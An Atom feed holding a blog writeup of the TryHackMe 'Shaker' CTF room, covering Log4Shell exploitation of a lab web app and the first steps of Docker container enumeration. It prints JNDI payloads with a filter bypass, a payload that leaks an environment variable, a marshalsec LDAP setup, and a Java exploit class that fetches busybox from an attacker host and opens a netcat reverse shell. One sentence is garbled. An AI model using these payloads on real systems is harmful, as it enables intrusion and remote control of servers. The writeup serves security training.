@@ -1,0 +1,297 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>OmegaVoid - Blog of Many Things - Writeups</title><link href="/" rel="alternate"></link><link href="/feeds/writeups.atom.xml" rel="self"></link><id>/</id><updated>2022-01-26T12:00:00+00:00</updated><subtitle>Blog of Many Things</subtitle><entry><title>TryHackMe: Shaker Writeup</title><link href="/tryhackme-shaker.html" rel="alternate"></link><published>2022-01-26T12:00:00+00:00</published><updated>2022-01-26T12:00:00+00:00</updated><author><name>OmegaVoid</name></author><id>tag:None,2022-01-26:/tryhackme-shaker.html</id><summary type="html">&lt;p&gt;I don't often post writeups for CTF rooms, but I decided to make an exception for Shaker at TryHackme because I thought it not only did a very good demonstration of the impact of the recently infamous Log4Shell vulnerability but also showcased how hard it can be to secure a docker container.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I don't often post writeups for CTF rooms, but I decided to make an exception for Shaker at TryHackme because I thought it not only did a very good demonstration of the impact of the recently infamous Log4Shell vulnerability but also showcased how hard it can be to secure a docker container.&lt;/p&gt;
+&lt;p&gt;For full disclosure, I tested this room before release and provided feedback to the author (Hydragyrum) during development. I did so without access to a walkthrough, however, to attempt to simulate the challenge the end-user would actually be faced with. The machine has since then been given a couple of changes and further hardening. The present writeup, however, represents the current iteration of the room, at the time of writing and not the earlier testing version.&lt;/p&gt;
+&lt;p&gt;The author's writeup can be found at: &lt;a href="https://hydrashead.net/posts/thm-shaker/"&gt;https://hydrashead.net/posts/thm-shaker/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I deviate from it quite a bit, however, and use it to demonstrate a few simpler attack techniques.&lt;/p&gt;
+&lt;h2&gt;Reconnaissance&lt;/h2&gt;
+&lt;p&gt;We'll start by doing a port and service scan with Nmap.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo nmap -sC -sV -p- -Pn &lt;span class="m"&gt;10&lt;/span&gt;.10.x.x -T4 -vv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Truncating the the results for brevity can easily identify two ports:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PORT     STATE  SERVICE    REASON         VERSION
+&lt;span class="m"&gt;22&lt;/span&gt;/tcp   open   ssh        syn-ack ttl &lt;span class="m"&gt;63&lt;/span&gt; OpenSSH &lt;span class="m"&gt;8&lt;/span&gt;.0 &lt;span class="o"&gt;(&lt;/span&gt;protocol &lt;span class="m"&gt;2&lt;/span&gt;.0&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; ...
+&lt;span class="m"&gt;8080&lt;/span&gt;/tcp open   http-proxy syn-ack ttl &lt;span class="m"&gt;62&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; ...
+&lt;span class="m"&gt;9090&lt;/span&gt;/tcp closed zeus-admin reset ttl &lt;span class="m"&gt;63&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We know we have an HTTP server on port 8080, and an OpenSSH on port 22 as is standard. We started by just browsing to the HTTP server and taking a look at the web application.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Application Screenshot." src="/images/shaker/app.png"&gt;&lt;/p&gt;
+&lt;p&gt;It's a simple application that takes an XML file and does something to it. So we create a very simple XML file, to see what exactly it does.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;author&amp;gt;&lt;/span&gt;OmegaVoid&lt;span class="nt"&gt;&amp;lt;/author&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Shaker&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;description&amp;gt;&lt;/span&gt;This is not the actual blog post xml, but how meta.&lt;span class="nt"&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;tag&amp;gt;&lt;/span&gt;writeup&lt;span class="nt"&gt;&amp;lt;/tag&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We'll name it &lt;code&gt;post.xml&lt;/code&gt; and upload it to the application.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Application result after uploading post.xml." src="/images/shaker/app-response.png"&gt;&lt;/p&gt;
+&lt;p&gt;The result is it just reordered the items in XML. Pretty useless application, but now we have a baseline knowledge of what it does.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;Download Here!&lt;/code&gt; link is: &lt;code&gt;http://10.10.x.x:8080/uploads/22c62a3ceca270.xml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Which reveals an upload folder, and the xml has been renamed.&lt;/p&gt;
+&lt;p&gt;At this point we'd naturally be thinking that we could be facing an XXE or File Upload vulnerability. 
+However, if you go in that direction, we will quickly find ourselves in a rabbit hole, and none of our payloads seem to work. &lt;/p&gt;
+&lt;p&gt;And if payloads don't work after a few minutes/hours, we force ourselves to move on.&lt;/p&gt;
+&lt;p&gt;But we're not done with Recon. There's a couple of extra hints in this last page.&lt;/p&gt;
+&lt;p&gt;Looking at the source code:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Comment in the source code." src="/images/shaker/source-comment.png"&gt;&lt;/p&gt;
+&lt;p&gt;At the time of room release, this should be instantly firing up alerts on your brain. If not, there's another hint in the favicon:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Application Favicon" src="/images/shaker/favicon.png"&gt;&lt;/p&gt;
+&lt;p&gt;Most people I know missed that one, but it's pretty normal to not notice favicons, and a custom one might not exactly catch your attention, so don't stress it. It's pretty funny though - and a clear reference to Log4Shell - CVE-2021-44228. For a great post about it see: &lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;https://www.lunasec.io/docs/blog/log4j-zero-day/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Either way, finding a mention to logs should have been enough to get us started. At this point, we could start fuzzing to search for the logs, and trying to use a custom number list to find those 4 suffix numbers, in an attempt to get access to the actual log files. This would facilitate our exploitation.&lt;/p&gt;
+&lt;p&gt;However, this is not strictly necessary, and I actively avoided it because Hydragyrum is known for having fail2ban bruteforce protection on his challenges. Turns out he didn't have it enabled on this one, so we missed that, but we'll use the opportunity to do some black-box exploitation.&lt;/p&gt;
+&lt;h2&gt;Log4Shell - CVE-2021-44228&lt;/h2&gt;
+&lt;p&gt;Log4Shell is a now infamous vulnerability that the infosec community will be hearing about for years to come. This flaw the Log4j java software component has a varied impact and can be exploited in multiple ways. The most common method of exploitation consists of providing a specific string to application inputs, and when that message is logged it causes a message lookup, which starts a request via JNDI (Java Naming and Directory Interface) which uses a directory service (like LDAP) to obtain and execute Java resources, resulting in RCE (Remote Code Execution).&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It is worth pointing out that there are other possibilities of exploitation. For insntance, even if RCE is not obtained it can be possible to use this to exfiltrate Environment Variables via non JNDI payloads such as &lt;code&gt;${env:USERNAME}&lt;/code&gt; (so keep your env close and your AWS API keys closer). We can even nest these lookups to exfiltrate data via DNS, or other services. We will make use of this later.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;For some detailed instructions on this vulnerability and how to exploit it see the room: &lt;a href="https://tryhackme.com/room/solar"&gt;https://tryhackme.com/room/solar&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The exploit essentially consists of 4 steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We submit a payload on a logged input in the application.&lt;/li&gt;
+&lt;li&gt;The application processes the message lookup and requests the java resource from a directory service (LDAP in this case).&lt;/li&gt;
+&lt;li&gt;LDAP provides a reference to the location where the java resource can be obtained.&lt;/li&gt;
+&lt;li&gt;Application download the java resource, and executes it.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Ok. Now that I've bored you to death with a bit of details, what can we do in our application? We can supply as many inputs as we find with the payload until we find something vulnerable. We can try the XML filename, we can try the XML content, we can try different headers in our HTTP request, etc.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note: If we had fuzzed and found the logs, we would have a better understanding of what's being logged, and we could build our payload faster. But we decided not to, and so with less enumeration, things get dirtier.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;How do we do this? We place the following payload on all the possible inputs we can think of (one at a time):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;jndi&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;ldap&lt;/span&gt;&lt;span class="p"&gt;://ATTACKER_IP_ADDRESS:&lt;/span&gt;&lt;span class="nv"&gt;8080&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And we start a netcat listener on port 8080.&lt;/p&gt;
+&lt;p&gt;We tried a few things and when we tried the xml content:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;author&amp;gt;&lt;/span&gt;${jndi:ldap://ATTACKER_IP_ADDRESS:8080/}&lt;span class="nt"&gt;&amp;lt;/author&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Shaker&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;description&amp;gt;&lt;/span&gt;This is not the actual blog post xml, but how meta.&lt;span class="nt"&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
+  &lt;span class="nt"&gt;&amp;lt;tag&amp;gt;&lt;/span&gt;writeup&lt;span class="nt"&gt;&amp;lt;/tag&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We got the response:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Invalid XML response." src="/images/shaker/invalid.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ok. There's a filter in place. So, let's try the simplest of filter bypasses:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:8080/}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The application hangs, and we get a call on our listener&lt;/p&gt;
+&lt;p&gt;&lt;img alt="The target callback proving it's vulnerable." src="/images/shaker/callback.png"&gt;&lt;/p&gt;
+&lt;p&gt;Ok. So we know the target is vulnerable. So we need to set up the remaining steps for exploitation, to try to obtain RCE.&lt;/p&gt;
+&lt;p&gt;We start a marshalsec (&lt;code&gt;**https://github.com/mbechler/marshalsec**&lt;/code&gt;) utility to serve as an LDAP referral service.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ATTACKER_IP_ADDRESS:8000/#Exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This outputs “Listening on 0.0.0.0:1389” which mean that if we point our payload to:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ldap://ATTACKER_IP_ADDRESS:1389/Exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;It will then tell the server to download Exploit.class from port 8000 on our attack machine.&lt;/p&gt;
+&lt;p&gt;So all we need now is an Exploit.class&lt;/p&gt;
+&lt;p&gt;We will start with a simple exploit from the Solar room I mentioned earlier.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Exploit&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;lang&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ping -c 4 ATTACKER_IP_ADDRESS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We compile it with a java 8 compiler:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;javac Exploit.java
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And host it on port 8000 with &lt;code&gt;python3 -m http.server&lt;/code&gt; or &lt;code&gt;updog&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;To check if we have RCE, we start tcp dump and look for pings:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo tcpdump -i tun0 icmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And finally whttps://github.com/jpillora/chisele upload our payload:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And while we see a call on both marshall and our http server, we do not get a ping.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="The application requests our exploit from marshalsec." src="/images/shaker/call-marshalsec1.png"&gt;&lt;/p&gt;
+&lt;p&gt;There could be multiple reasons for this. One of them could simply be that there's no ping binary. We tried a few other commands to no avail. No bash, no netcat, no wget, no curl.&lt;/p&gt;
+&lt;p&gt;The author probably removed what he considered unnecessary binaries from container in an effort harden it further. This is a legitimate tactic as it makes living off the land much harder and increases the skill requirements for exploitation. However, with a vulnerability like log4j this is clearly insufficient because the vulnerability is essentially giving you programmatic access to all the features of the operating system.&lt;/p&gt;
+&lt;p&gt;You don't have curl? Java can download for you. You don't have chmod? Java can change file permissions for you. We can take this as far as we want. However, if we're going to create a file, we have to deploy it somewhere we know we have permissions to.&lt;/p&gt;
+&lt;p&gt;I tried /tmp/ at first but was unable to exploit, which means Hydragyrum probably hardened that as well. But we know exactly where we can create a file in the filesystem. the application uploads folder.&lt;/p&gt;
+&lt;p&gt;So let's check the context of the application:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/${env:PWD}}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We use this payload to leak the PWD environment variable which tells us the current path where the application is being executed.&lt;/p&gt;
+&lt;p&gt;This return the following in marshalsec:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Send LDAP reference result &lt;span class="k"&gt;for&lt;/span&gt; /app redirecting to http://ATTACKER_IP_ADDRESS:8000/Exploit.class
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This tells us the application is running in &lt;code&gt;/app&lt;/code&gt; . So we will attempt to upload a binary to &lt;code&gt;/app/uploads&lt;/code&gt; (or we could use a relative path since we're already in &lt;code&gt;/app&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;To make thing easier for ourselves, we can now use java to upload a busybox static binary, make it executable and then make use of all the tools included in busybox to exploit the target.&lt;/p&gt;
+&lt;p&gt;You can obtain busybox binaries from: &lt;a href="https://busybox.net/downloads/binaries/"&gt;https://busybox.net/downloads/binaries/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We'll host it on the same http server as our java exploit.&lt;/p&gt;
+&lt;p&gt;Then we craft our java exploit to download busybox, change permissions, and execute a command that will give us a shell on port 8080.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.*&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.lang.*&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.StandardCopyOption&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.net.URL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.Paths&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.nio.file.Files&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Exploit&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;ATTACKER_IP_ADDRESS&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+            &lt;span class="c1"&gt;//Download the file&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;FILE_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;:8000/busybox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+            &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;FILE_PATH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/app/uploads/busybox&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+            &lt;span class="n"&gt;InputStream&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FILE_URL&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;openStream&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+            &lt;span class="n"&gt;Files&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Paths&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FILE_PATH&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;StandardCopyOption&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;REPLACE_EXISTING&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+            &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FILE_PATH&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+            &lt;span class="c1"&gt;//check if file exists&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;()){&lt;/span&gt;
+
+                &lt;span class="c1"&gt;//change file permissions&lt;/span&gt;
+                &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setExecutable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setReadable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+                &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setWritable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+            &lt;span class="p"&gt;}&lt;/span&gt;
+
+            &lt;span class="c1"&gt;//Execute a command that gives us a reverse shell&lt;/span&gt;
+            &lt;span class="n"&gt;Runtime&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+            &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/app/uploads/busybox nc &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; 8080 -e /app/uploads/busybox sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;waitFor&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+
+
+        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We compile it, set up a listener on port 8080, and send our payload again:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;post&amp;gt;&lt;/span&gt;${${::-j}ndi:ldap://ATTACKER_IP_ADDRESS:1389/Exploit}&lt;span class="nt"&gt;&amp;lt;/post&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="We get a reverse shell." src="/images/shaker/revshell.png"&gt;&lt;/p&gt;
+&lt;p&gt;And we obtain our user shell. And the first flag as well.&lt;/p&gt;
+&lt;h2&gt;Docker Enumeration&lt;/h2&gt;
+&lt;p&gt;Looking at the root of the filesystem we can see we're in a docker container. We can also confirm that &lt;code&gt;/tmp&lt;/code&gt; was indeed not writable by user 1000.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Container file system." src="/images/shaker/container-fs.png"&gt;&lt;/p&gt;
+&lt;p&gt;We could have written busybox directly to &lt;code&gt;/app&lt;/code&gt;, but we knew for sure that we could place it in uploads.&lt;/p&gt;
+&lt;p&gt;We'll start docker enumeration with the network side of things. As suspected earlier, the container is missing a lot of useful binaries, but that's not a problem since we uploaded busybox.
+First step is obtaining the IP address of the container:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Obtaining the IP address" src="/images/shaker/container-ip.png"&gt;&lt;/p&gt;
+&lt;p&gt;Using &lt;code&gt;ip route get 1&lt;/code&gt; to obtain the address of the host:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Obtaining Host IP." src="/images/shaker/container-ip-route.png"&gt;&lt;/p&gt;
+&lt;p&gt;At this point one option is to ping sweep for other containers, the other is to port scan the host to try to see what other services it might be running. For either option a static nmap binary would greatly facilitate things.&lt;/p&gt;
+&lt;p&gt;We download nmap and port scan the host.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Host Nmap Scan." src="/images/shaker/container-nmap.png"&gt;&lt;/p&gt;
